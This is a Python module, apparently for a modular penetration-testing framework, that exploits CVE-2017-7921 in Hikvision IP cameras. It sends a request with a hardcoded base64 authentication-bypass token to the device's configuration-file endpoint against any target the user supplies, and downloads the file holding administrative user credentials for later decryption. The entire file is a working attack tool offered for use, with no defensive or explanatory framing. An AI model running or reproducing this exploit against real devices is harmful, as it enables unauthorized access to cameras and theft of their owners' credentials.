import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "hikvision/cve_2017_7921_attack"
        self.description = "Exploit module to extract the raw administrative users database payload from Hikvision (CVE-2017-7921)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/System/configurationFile?auth=YWRtaW46MTIzNDU="
        else:
            url = f"{target.rstrip('/')}/System/configurationFile?auth=YWRtaW46MTIzNDU="
            
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Downloading Hikvision sensitive configuration file backup layout...\033[0m")
                response = await client.get(url)
                if response.status_code == 200:
                    return {
                        "success": True,
                        "details": f"Hikvision configuration file intercepted successfully. File size: {len(response.content)} bytes. Ready for local decryption tools."
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit delivery rejected by target firmware validation matrix."}
